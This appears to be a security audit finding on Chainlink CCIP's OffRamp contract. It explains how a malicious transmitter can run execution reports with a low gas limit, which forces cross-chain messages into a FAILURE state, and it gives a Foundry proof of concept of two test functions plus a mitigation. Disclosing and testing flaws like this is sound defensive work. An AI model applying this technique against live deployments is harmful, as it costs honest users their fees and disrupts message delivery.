S-436
Malicious transmitters can force messages to fail by executing reports with a low gas limit
spuriousdragon
00
Sufficient
383d ago
Finding description and impact

In order to avoid situations where one message failing affects the whole batch execution logic and makes the whole transaction revert, CCIP implements a safety mechanism where messages that fail will be directly set to a FAILURE state instead of reverting. This can be seen in the _trialExecute function:

// File: OffRamp.sol
function _trialExecute(
    Internal.Any2EVMRampMessage memory message,
    bytes[] memory offchainTokenData,
    uint32[] memory tokenGasOverrides
  ) internal returns (Internal.MessageExecutionState executionState, bytes memory) {
    try this.executeSingleMessage(message, offchainTokenData, tokenGasOverrides) {} 
    catch (bytes memory err) {
      // return the message execution state as FAILURE and the revert data.
      // Max length of revert data is Router.MAX_RET_BYTES, max length of err is 4 + Router.MAX_RET_BYTES.
      return (Internal.MessageExecutionState.FAILURE, err);
    }
    // If message execution succeeded, no CCIP receiver return data is expected, return with empty bytes.
    return (Internal.MessageExecutionState.SUCCESS, "");
  }


As shown, if executeSingleMessage (which contains the message execution logic) fails, the error is catched and the message is set to FAILURE.

The problem with the current implementation is that malicious transmitters can force messages to always fail by triggering execute with a low gas limit, intentionally setting messages directly to FAILURE state, even if the sender configured the correct gas limit. Note how, as discussed in C4's CCIP discord channel, "Up to f nodes can be malicious, since transmitters are nodes, some transmitters could be malicous", so considering at least one transmitter to be malicious is in scope.

This is possible because of how failures are currently handled. In previous CCIP versions, issues found inside executeSingleMessage where handled according to the type of revert encountered during the message execution process:

// File: EVM2EVMOffRamp.sol, from CCIP'S CodeHawks contest
function _trialExecute(
    Internal.EVM2EVMMessage memory message,
    bytes[] memory offchainTokenData
  ) internal returns (Internal.MessageExecutionState, bytes memory) {
    try this.executeSingleMessage(message, offchainTokenData) {}
    catch (bytes memory err) {
      if ( 
        ReceiverError.selector == bytes4(err) || TokenHandlingError.selector == bytes4(err)
          || Internal.InvalidEVMAddress.selector == bytes4(err) || InvalidDataLength.selector == bytes4(err)
          || CallWithExactGas.NoContract.selector == bytes4(err) || NotACompatiblePool.selector == bytes4(err)
      ) { 
        // If CCIP receiver execution is not successful, bubble up receiver revert data,
        // prepended by the 4 bytes of ReceiverError.selector, TokenHandlingError.selector or InvalidPoolAddress.selector.
        // Max length of revert data is Router.MAX_RET_BYTES, max length of err is 4 + Router.MAX_RET_BYTES
        return (Internal.MessageExecutionState.FAILURE, err);
      }
      // If revert is not caused by CCIP receiver, it is unexpected, bubble up the revert.
      revert ExecutionError(err);
    }
    // If message execution succeeded, no CCIP receiver return data is expected, return with empty bytes.
    return (Internal.MessageExecutionState.SUCCESS, "");
  } 

There were other errors that were not catched in that statement, and that forced the whole transaction to revert instead. This was done to prevent malicious transmitters from trying to force messages to be incorrectly set to FAILURE state. A good example of when a message revert must not be catched and set to FAILURE state, and must instead make the whole transaction revert is when not enough gas is submitted by the transmitter. If not enough gas is submitted by the transmitter, the low-level calls performed inside the message execution logic via CallWithExactGas will identify it, and revert with the appropriate revert reason:

// File: CallWithExactGas.sol

function _callWithExactGasSafeReturnData(
    bytes memory payload,
    address target,
    uint256 gasLimit,
    uint16 gasForCallExactCheck,
    uint16 maxReturnBytes
  ) internal returns (bool success, bytes memory retData, uint256 gasUsed) {
    // allocate retData memory ahead of time
    retData = new bytes(maxReturnBytes);

    assembly {
      ...

      let g := gas()
      // Compute g -= gasForCallExactCheck and check for underflow
      // The gas actually passed to the callee is _min(gasAmount, 63//64*gas available).
      // We want to ensure that we revert if gasAmount >  63//64*gas available
      // as we do not want to provide them with less, however that check itself costs
      // gas. gasForCallExactCheck ensures we have at least enough gas to be able
      // to revert if gasAmount >  63//64*gas available.
      if lt(g, gasForCallExactCheck) {
        mstore(0x0, NO_GAS_FOR_CALL_EXACT_CHECK_SIG)
        revert(0x0, 0x4)
      }
      g := sub(g, gasForCallExactCheck) 
      // if g - g//64 <= gasAmount, revert. We subtract g//64 because of EIP-150
      if iszero(gt(sub(g, div(g, 64)), gasLimit)) { 
        mstore(0x0, NOT_ENOUGH_GAS_FOR_CALL_SIG)
        revert(0x0, 0x4)
      }

With the current implementation, if a malicious transmitter submits a low gas limit that makes the contract revert with NOT_ENOUGH_GAS_FOR_CALL_SIG, the revert will still be catched, and the message will be incorrectly set to FAILURE. This is incorrect, as transmitters can submit batches of messages with low gas limit, forcing messages to be set to FAILURE state.

The impact of this vulnerability is making honest users lose their paid fees when sending the message on the origin chain, as the message will need to be re-executed so that it can be properly delivered. In addition, it will also cause delays and malfunctioning of CCIP.

Proof of Concept

The following proof of concept shows two tests included in the OffRamp.t.sol file provided in the project. They demonstrate how a malicious transmitter can force messages to fail by submitting them with a low gas limit. I have included two scenarios:

Messages that try to deliver data
Messages that try to send tokens

In both situations, the transmitter succesfully sets messages that should have been properly delivered to FAILURE state.

In order to run the poc, just paste the following snippet in OffRamp.t.sol and run it with forge test --mt testforceFailedMessagesDataTransfer or forge test --mt testforceFailedMessagesTokenTransfer, depending


    function testforceFailedMessagesDataTransfer() public {
        // Step 1: Generate simple message. This message does not transfer tokens, but attempts
        // to deliver data by setting a gas limit of 200_000.
        Internal.Any2EVMRampMessage[]
            memory messages = _generateSingleBasicMessage(
                SOURCE_CHAIN_SELECTOR_1,
                ON_RAMP_ADDRESS_1
            );
        Internal.ExecutionReport[]
            memory reports = _generateBatchReportFromMessages(
                SOURCE_CHAIN_SELECTOR_1,
                messages
            );

        vm.expectEmit();
        emit MultiOCR3Base.Transmitted(
            uint8(Internal.OCRPluginType.Execution),
            s_configDigestExec,
            uint64(uint256(s_configDigestExec))
        );

        // Step 2: Malicious transmitter executes the report containing the message. A low gas limit is set
        // in order to force a `NotEnoughGasForCall` error when calling the receiver in the router.
        // The non-consumed gas is returned to the caller (OffRamp), and the execution is finished gracefully,
        // forcing the message to fail.

        _execute(reports, 200_000);

        // Status of the message is `FAILURE`.
        Internal.MessageExecutionState state = s_offRamp.getExecutionState(
            SOURCE_CHAIN_SELECTOR_1,
            1
        );
        assertEq(uint8(state), uint8(Internal.MessageExecutionState.FAILURE));
    }

    function testforceFailedMessagesTokenTransfer() public {
        // Step 1: Generate simple message. This message DOES transfer tokens.
        Internal.Any2EVMRampMessage[]
            memory messages = _generateMessagesWithTokens(
                SOURCE_CHAIN_SELECTOR_1,
                ON_RAMP_ADDRESS_1
            );
        Internal.ExecutionReport[]
            memory reports = _generateBatchReportFromMessages(
                SOURCE_CHAIN_SELECTOR_1,
                messages
            );

        vm.expectEmit();
        emit MultiOCR3Base.Transmitted(
            uint8(Internal.OCRPluginType.Execution),
            s_configDigestExec,
            uint64(uint256(s_configDigestExec))
        );



        // Step 2: Malicious transmitter executes the report containing the message. For
        // token transfers, the destination overhead is at least 90_000, and gas consumed until token unlocks
        // is arount 100_00k. Setting the gas limit at 200_000 is enough to ensure both token transfers will fail, 
        // while the whole execution flow will still finish gracefully, setting both token transfers as failed.
        _execute(reports, 200_000);

        // Status of both token transfers is `FAILURE`.
        // Query first message (seq. number 1)
        Internal.MessageExecutionState state = s_offRamp.getExecutionState(
            SOURCE_CHAIN_SELECTOR_1,
            1
        );
        assertEq(uint8(state), uint8(Internal.MessageExecutionState.FAILURE));
        
        // Query second message (seq. number 2)
        state = s_offRamp.getExecutionState(SOURCE_CHAIN_SELECTOR_1, 2);
        assertEq(uint8(state), uint8(Internal.MessageExecutionState.FAILURE));
    }
Recommended mitigation steps

As shown in the provided snippet from CCIP's CodeHawks contest, only set the message to FAILURE state if the revert reason is an acceptable situation where the message was not forced to actually fail. It is important to be aware that under no circumstance the following revert reasons should be accepted to be handled gracefully:

NO_GAS_FOR_CALL_EXACT_CHECK_SIG
NOT_ENOUGH_GAS_FOR_CALL_SIG

Instead, if such error is encountered, the logic inside the catch statement should directly revert the whole transaction so that other transmitters can succesfully deliver the message.
